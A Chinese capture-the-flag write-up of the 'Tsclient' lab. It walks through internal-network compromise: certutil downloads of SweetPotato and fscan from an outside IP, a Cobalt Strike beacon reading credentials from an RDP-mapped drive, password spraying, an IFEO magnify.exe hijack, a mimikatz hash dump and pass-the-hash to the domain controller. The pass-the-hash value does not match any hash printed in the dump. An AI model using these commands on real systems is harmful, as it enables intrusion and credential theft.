# 春秋云境-Tsclient综合渗透


春秋云境-Tsclient综合渗透通关wp

<!--more-->

![image-20250219162452201](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250219162452201.png?imageSlim)

靶标介绍：Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。

### flag01

起手fscan

```bash
E:\Tools\web\fscan_1.8.4>fscan.exe -h 39.98.122.67

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.98.122.67:445 open
39.98.122.67:139 open
39.98.122.67:1433 open
39.98.122.67:80 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle http://39.98.122.67       code:200 len:703    title:IIS Windows Server
[+] mssql 39.98.122.67:1433:sa 1qaz!QAZ
已完成 4/4
[*] 扫描结束,耗时: 9.790536s
```

发现mssql弱口令，上MDUT

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250219135800-i0354dm.png?imageSlim)​

```bash
>ipconfig


Windows IP 配置


以太网适配器 以太网:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::fcb3:72d7:fb96:783b%14
   IPv4 地址 . . . . . . . . . . . . : 172.22.8.18
   子网掩码  . . . . . . . . . . . . : 255.255.0.0
   默认网关. . . . . . . . . . . . . : 172.22.255.253

隧道适配器 isatap.{E309DFD0-37D7-4E89-A23A-3C61210B34EA}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
   连接特定的 DNS 后缀 . . . . . . . : 

隧道适配器 Teredo Tunneling Pseudo-Interface:

   连接特定的 DNS 后缀 . . . . . . . : 
   IPv6 地址 . . . . . . . . . . . . : 2001:0:348b:fb58:3883:3151:d89d:85bc
   本地链接 IPv6 地址. . . . . . . . : fe80::3883:3151:d89d:85bc%12
   默认网关. . . . . . . . . . . . . : ::

>systeminfo


主机名:           WIN-WEB
OS 名称:          Microsoft Windows Server 2016 Datacenter
OS 版本:          10.0.14393 暂缺 Build 14393
OS 制造商:        Microsoft Corporation
OS 配置:          独立服务器
OS 构件类型:      Multiprocessor Free
注册的所有人:   
注册的组织:       Aliyun
产品 ID:          00376-40000-00000-AA947
初始安装日期:     2022/7/11, 12:46:14
系统启动时间:     2025/2/19, 13:51:45
系统制造商:       Alibaba Cloud
系统型号:         Alibaba Cloud ECS
系统类型:         x64-based PC
处理器:           安装了 1 个处理器。
                  [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz
BIOS 版本:        SeaBIOS 449e491, 2014/4/1
Windows 目录:     C:\Windows
系统目录:         C:\Windows\system32
启动设备:         \Device\HarddiskVolume1
系统区域设置:     zh-cn;中文(中国)
输入法区域设置:   zh-cn;中文(中国)
时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐
物理内存总量:     3,950 MB
可用的物理内存:   937 MB
虚拟内存: 最大值: 4,770 MB
虚拟内存: 可用:   683 MB
虚拟内存: 使用中: 4,087 MB
页面文件位置:     C:\pagefile.sys
域:               WORKGROUP
登录服务器:       暂缺
修补程序:         安装了 6 个修补程序。
                  [01]: KB5013625
                  [02]: KB4049065
                  [03]: KB4486129
                  [04]: KB4486131
                  [05]: KB5014026
                  [06]: KB5013952
网卡:             安装了 1 个 NIC。
                  [01]: Red Hat VirtIO Ethernet Adapter
                      连接名:      以太网
                      启用 DHCP:   是
                      DHCP 服务器: 172.22.255.253
                      IP 地址
                        [01]: 172.22.8.18
                        [02]: fe80::fcb3:72d7:fb96:783b
Hyper-V 要求:     已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。


>whoami /priv


特权信息
----------------------

特权名                        描述                 状态  
============================= ==================== ======
SeAssignPrimaryTokenPrivilege 替换一个进程级令牌   已禁用
SeIncreaseQuotaPrivilege      为进程调整内存配额   已禁用
SeChangeNotifyPrivilege       绕过遍历检查         已启用
SeImpersonatePrivilege        身份验证后模拟客户端 已启用
SeCreateGlobalPrivilege       创建全局对象         已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用
```

尝试sweetpotato提权

```bash
certutil -urlcache -split -f http://39.106.75.37/SweetPotato.exe C:\windows\temp\sweet.exe
```

提权成功

```bash
C:/Windows/Temp/sweet.exe -a whoami
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250219140717-k7qpdfq.png?imageSlim)​

上线cs

```bash
C:/Windows/Temp/sweet.exe -a C:/Windows/Temp/cs.exe
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250219142848-vl3zvui.png?imageSlim)​

下载flag

```bash
 _________  ________  ________  ___       ___  _______   ________   _________
|\___   ___\\   ____\|\   ____\|\  \     |\  \|\  ___ \ |\   ___  \|\___   ___\
\|___ \  \_\ \  \___|\ \  \___|\ \  \    \ \  \ \   __/|\ \  \\ \  \|___ \  \_|
     \ \  \ \ \_____  \ \  \    \ \  \    \ \  \ \  \_|/_\ \  \\ \  \   \ \  \
      \ \  \ \|____|\  \ \  \____\ \  \____\ \  \ \  \_|\ \ \  \\ \  \   \ \  \
       \ \__\  ____\_\  \ \_______\ \_______\ \__\ \_______\ \__\\ \__\   \ \__\
        \|__| |\_________\|_______|\|_______|\|__|\|_______|\|__| \|__|    \|__|
              \|_________|


Getting flag01 is easy, right?

flag01: flag{REDACTED}


Maybe you should focus on user sessions...
```

### flag02

fscan 扫内网

```bash
certutil -urlcache -split -f http://39.106.75.37:8000/fscan.exe C:\windows\temp\fscan.exe

C:\windows\temp\sweet.exe -a "C:\windows\temp\fscan.exe -h 172.22.8.18/24"
```

得到结果

```bash
start infoscan
(icmp) Target 172.22.8.18     is alive
(icmp) Target 172.22.8.15     is alive
(icmp) Target 172.22.8.31     is alive
(icmp) Target 172.22.8.46     is alive
[*] Icmp alive hosts len is: 4
172.22.8.15:88 open
172.22.8.46:445 open
172.22.8.31:445 open
172.22.8.18:1433 open
172.22.8.15:445 open
172.22.8.31:135 open
172.22.8.18:445 open
172.22.8.46:139 open
172.22.8.31:139 open
172.22.8.15:139 open
172.22.8.46:135 open
172.22.8.18:139 open
172.22.8.15:135 open
172.22.8.46:80 open
172.22.8.18:135 open
172.22.8.18:80 open
[*] alive ports len is: 16
start vulscan
[*] NetInfo 
[*]172.22.8.18
   [->]WIN-WEB
   [->]172.22.8.18
   [->]2001:0:348b:fb58:3883:3151:d89d:85bc
[*] NetInfo 
[*]172.22.8.31
   [->]WIN19-CLIENT
   [->]172.22.8.31
[*] NetInfo 
[*]172.22.8.46
   [->]WIN2016
   [->]172.22.8.46
[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server
[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT     
[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01       
[*] NetInfo 
[*]172.22.8.15
   [->]DC01
   [->]172.22.8.15
[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393
[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server
[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ

[+] Process created, enjoy!
```

有RDP

```bash
172.22.8.15:3389 open
172.22.8.31:3389 open
172.22.8.46:3389 open
172.22.8.18:3389 open
```

和NetBIOS

```bash
172.22.8.15 XIAORANG\DC01 # 域控
172.22.8.31 XIAORANG\WIN19-CLIENT
172.22.8.46 WIN2016.xiaorang.lab
172.22.8.18 WIN-WEB # 本机
```

发现有其他用户使用rdp连接过来

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250219144500-e61cz0v.png?imageSlim)​

注入John进程

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250219144637-4b1c4ak.png?imageSlim)​

对user John查看网络共享

```bash
shell net use
```

得到

```bash
状态       本地        远程                      网络

-------------------------------------------------------------------------------
                       \\TSCLIENT\C              Microsoft Terminal Services
命令成功完成
```

随后

```bash
beacon> shell dir \\TSCLIENT\C
[*] Tasked beacon to run: dir \\TSCLIENT\C
[+] host called home, sent: 47 bytes
[+] received output:
 驱动器 \\TSCLIENT\C 中的卷没有标签。
 卷的序列号是 C2C5-9D0C

 \\TSCLIENT\C 的目录

2022/07/12  10:34                71 credential.txt
2022/05/12  17:04    <DIR>          PerfLogs
2022/07/11  12:53    <DIR>          Program Files
2022/05/18  11:30    <DIR>          Program Files (x86)
2022/07/11  12:47    <DIR>          Users
2022/07/11  12:45    <DIR>          Windows
               1 个文件             71 字节
               5 个目录 30,041,149,440 可用字节
```

读以下txt

```bash
beacon> shell type \\TSCLIENT\C\credential.txt
[*] Tasked beacon to run: type \\TSCLIENT\C\credential.txt
[+] host called home, sent: 63 bytes
[+] received output:
xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#
```

代理转发

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250219151324-kckzgzq.png?imageSlim)​

尝试密码喷洒攻击

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ crackmapexec smb 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250219152637-wgxvnx0.png?imageSlim)​

STATUS_LPGON_FAILURE，密码已经过期

```bash
python3 smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.15 -newpass 'qweQWE123'
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250219153237-56hktid.png?imageSlim)​

rdp登录172.22.8.46

```bash
Aldrich@xiaorang.lab
qweQWE123#
```

发现不出网

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250219153923-fjh3rd2.png?imageSlim)​

尝试放大镜提权

```bash
Get-ACL -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl *
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250219155557-c4z0gf9.png?imageSlim)​

劫持，修改注册表

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v "Debugger" /t REG_SZ /d "c:\windows\system32\cmd.exe" /f
```

锁定用户，在右下角找到放大镜，读flag

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250219160242-r8qu72l.png?imageSlim)​

### flag03

```bash
beacon> logonpasswords
[*] Tasked beacon to run Mimikatz inject pid:1928
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command into 1928 (x64)
[+] host called home, sent: 297602 bytes
[+] received output:

Authentication Id : 0 ; 15467382 (00000000:00ec0376)
Session           : RemoteInteractive from 2
User Name         : Aldrich
Domain            : XIAORANG
Logon Server      : DC01
Logon Time        : 2023/7/30 17:28:43
SID               : S-1-5-21-3289074908-3315245560-3429321632-1105
	msv :
	 [00000003] Primary
	 * Username : Aldrich
	 * Domain   : XIAORANG
	 * NTLM     : e19ccf75ee54e06b06a5907af13cef42
	 * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
	 * DPAPI    : a3f0e6622289e7951e9a12b27368cda5
	tspkg :
	wdigest :
	 * Username : Aldrich
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :
	 * Username : Aldrich
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :
	credman :

Authentication Id : 0 ; 52967 (00000000:0000cee7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/7/30 16:21:58
SID               : S-1-5-90-0-1
	msv :
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a
	 * SHA1     : e06238ecefc14d675f762b08a456770dc000f763
	tspkg :
	wdigest :
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :
	 * Username : WIN2016$
	 * Domain   : xiaorang.lab
	 * Password : ...... (略)
	ssp :
	credman :

Authentication Id : 0 ; 52935 (00000000:0000cec7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/7/30 16:21:58
SID               : S-1-5-90-0-1
	msv :
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 02b2a436556a3dd5d6638ad03f87c43e
	 * SHA1     : c81ff31553d1e42093c29c46ed26bdca3257cc40
	tspkg :
	wdigest :
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :
	 * Username : WIN2016$
	 * Domain   : xiaorang.lab
	 * Password : ...... (略)
	ssp :
	credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WIN2016$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2023/7/30 16:21:58
SID               : S-1-5-20
	msv :
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 02b2a436556a3dd5d6638ad03f87c43e
	 * SHA1     : c81ff31553d1e42093c29c46ed26bdca3257cc40
	tspkg :
	wdigest :
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :
	 * Username : win2016$
	 * Domain   : XIAORANG.LAB
	 * Password : ...... (略)
	ssp :
	credman :

Authentication Id : 0 ; 23516 (00000000:00005bdc)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2023/7/30 16:21:58
SID               :
	msv :
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 02b2a436556a3dd5d6638ad03f87c43e
	 * SHA1     : c81ff31553d1e42093c29c46ed26bdca3257cc40
	tspkg :
	wdigest :
	kerberos :
	ssp :
	credman :

Authentication Id : 0 ; 15442286 (00000000:00eba16e)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/7/30 17:28:42
SID               : S-1-5-90-0-2
	msv :
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 02b2a436556a3dd5d6638ad03f87c43e
	 * SHA1     : c81ff31553d1e42093c29c46ed26bdca3257cc40
	tspkg :
	wdigest :
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :
	 * Username : WIN2016$
	 * Domain   : xiaorang.lab
	 * Password : ...... (略)
	ssp :
	credman :

Authentication Id : 0 ; 15442262 (00000000:00eba156)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/7/30 17:28:42
SID               : S-1-5-90-0-2
	msv :
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 02b2a436556a3dd5d6638ad03f87c43e
	 * SHA1     : c81ff31553d1e42093c29c46ed26bdca3257cc40
	tspkg :
	wdigest :
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :
	 * Username : WIN2016$
	 * Domain   : xiaorang.lab
	 * Password : ...... (略)
	ssp :
	credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/7/30 16:22:01
SID               : S-1-5-17
	msv :
	tspkg :
	wdigest :
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :
	ssp :
	credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/7/30 16:21:59
SID               : S-1-5-19
	msv :
	tspkg :
	wdigest :
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :
	credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WIN2016$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2023/7/30 16:21:58
SID               : S-1-5-18
	msv :
	tspkg :
	wdigest :
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :
	 * Username : win2016$
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :
	credman :
```

hash传递，利用wmiexec.py

```bash
python3 wmiexec.py -hashes :e212b78fc35c036877d53814c96d3d71 xiaorang.lab/WIN2016\$@172.22.8.15
```

在`C:\users\administrator\flag\flag03.txt`​

直接读flag03

```bash
flag03flag{294ce447-c166-4573-8596-0238bba3607d}
```

